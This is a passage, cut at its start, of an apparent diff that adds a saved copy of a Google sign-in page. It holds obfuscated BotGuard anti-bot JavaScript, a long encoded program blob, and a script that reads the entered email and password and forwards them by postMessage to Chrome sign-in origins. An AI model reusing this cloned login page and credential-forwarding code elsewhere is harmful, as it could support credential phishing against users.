this.w;try{if(p=(4<(0<(U=(0<(Q=(c=(x=(e=(this.b=false,this.c(this.a).length),this.c(this.C).length),this.c(this.B)),this.G[this.Y]&&f(this,this.c(this.Y)),this).c(this.X),Q.length)&&v(this,this.a,m(Q.length,2).concat(Q),this.Nt),F=this.c(this.K)&511,F-=this.c(this.a).length+5,this.c(this.C)),4<U.length&&(F-=U.length+3),F)&&v(this,this.a,m(F,2).concat(E(F)),this.kU),U.length)&&v(this,this.a,m(U.length,2).concat(U),this.gX),N=E(2).concat(this.c(this.a)),N[1]=N[0]^3,window).btoa?window.btoa(r(N)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,""):void 0,p)p="!"+p;else for(Q=0,p="";Q<N.length;Q++)b=N[Q][this.L](16),1==b.length&&(b="0"+b),p+=b;((this.c(this.a).length=e,this).c(this.C).length=x,Y)(this,this.B,c),d=p,this.b=true}catch(S){R(this,S),d=this.w}return d},D).PT=function(d,e,x,c,Q,F){for(x=[],F=c=0;F<d.length;F++)for(Q=Q<<e|d[F],c+=e;7<c;)c-=8,x.push(Q>>c&255);return x},D).l=function(d,e,x,c,Q,F){try{for(d=(x=(e=(c=0,5001),void 0),this).N.length;(--e||this.CE)&&(c=this.c(this.I))<d;)try{Y(this,this.$,c),Q=C(this),(x=this.c(Q))&&x.call?x(this):this.g(this.h,0,Q)}catch(U){U!=this.j&&(F=this.c(this.i),F!=this.i?(Y(this,F,U),Y(this,this.i,this.i)):this.g(this.m,U))}e||this.g(this.W)}catch(U){try{this.g(this.m,U)}catch(N){R(this,N)}}return this.c(this.v)},D).wX=function(d,e,x,c,Q){for(Q=c=0;Q<d.length;Q++)c+=d.charCodeAt(Q),c+=c<<10,c^=c>>6;return(c=new (d=(c+=c<<3,c^=c>>11,c)+(c<<15)>>>0,Number)(d&(1<<e)-1),c)[0]=(d>>>e)%x,c};try{window.addEventListener("unload",function(){},false)}catch(d){}V("botguard.bg",n),V("botguard.bg.prototype.invoke",n.prototype.BT);')})()</script>
+  <script type="text/javascript">
+  document.bg = new botguard.bg('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');
+  </script>
+<script>
+  (function() {
+  function gaia_setFocus() {
+  var form = null;
+  if (document.getElementById) {
+  form = document.getElementById('gaia_loginform');
+  }
+  if (form && form.Passwd) {
+  form.Passwd.focus();
+  }
+  }
+  if (!/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+  gaia_attachEvent(window, 'load', gaia_setFocus);
+  }
+  })();
+</script>
+<script>
+  var gaia_scrollToElement = function(element) {
+  var calculateOffsetHeight = function(element) {
+  var curtop = 0;
+  if (element.offsetParent) {
+  while (element) {
+  curtop += element.offsetTop;
+  element = element.offsetParent;
+  }
+  }
+  return curtop;
+  }
+  var siginOffsetHeight = calculateOffsetHeight(element);
+  var scrollHeight = siginOffsetHeight - window.innerHeight +
+  element.clientHeight + 0.02 * window.innerHeight;
+  window.scroll(0, scrollHeight);
+  }
+</script>
+<script>
+(function() {
+  var $ = function(id) { return document.getElementById(id); };
+  var gaiaLoginForm = $('gaia_loginform');
+  var chromeExt = 'chrome-extension://mfffpogegjflfpflabcdkioaeobkgjik';
+  var chromeSigninUrl = 'chrome://chrome-signin';
+  var chromeOsUrl = 'chrome://oobe';
+  var chromeWebview = undefined;
+  onMessage = function(e) {
+  if (e.origin == chromeSigninUrl || e.origin == chromeOsUrl) {
+  chromeWebview = e.source;
+  }
+  };
+  window.addEventListener('message', onMessage);
+  gaia_onChromeLoginSubmit = function(e) {
+  if (!chromeWebview && window == window.parent) {
+  return;
+  }
+  if (gaiaLoginForm['Email'] && gaiaLoginForm['Passwd']) {
+  var checkboxElement = $('advanced-box');
+  var chooseWhatToSync = checkboxElement && checkboxElement.checked;
+  var attemptToken = new Date().getTime();
+  var msg = {method: 'attemptLogin',
+  email: gaiaLoginForm['Email'].value,
+  password: gaiaLoginForm['Passwd'].value,
+  attemptToken: attemptToken,
+  chooseWhatToSync: chooseWhatToSync};
+  if (chromeWebview) {
+  chromeWebview.postMessage(msg, chromeSigninUrl);
+  } else {
+  window.parent.postMessage(msg, chromeExt);
+  }
+  console.log('Credentials sent');
+  var continueUrlElement = gaiaLoginForm['continue'];
+  if (continueUrlElement) {
+  var prevAttemptIndex = continueUrlElement.value.indexOf('?attemptToken');
+  if (prevAttemptIndex != -1) {
+  continueUrlElement.value = continueUrlElement.value.substr(
+  0, prevAttemptIndex);
+  }
+  continueUrlElement.value += '?attemptToken=' + attemptToken;
+  }
+  }
+  };
+  gaia_attachEvent(gaiaLoginForm, 'submit', gaia_onChromeLoginSubmit);
+})();
+</script>
+<script>
+  function gaia_onLoginSubmit() {
+  try {
+  document.bg.invoke(function(response) {
+  document.getElementById('bgresponse').value = response;
+  });
+  } catch (err) {
+  document.getElementById('bgresponse').value = '';
+  }
+  return true;
+  }
+  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
+  var signinButton = document.getElementById('signIn');
+  gaia_attachEvent(window, 'load', function(){
+  gaia_scrollToElement(signinButton);
+  });
+</script>
+  </body>
+</html>
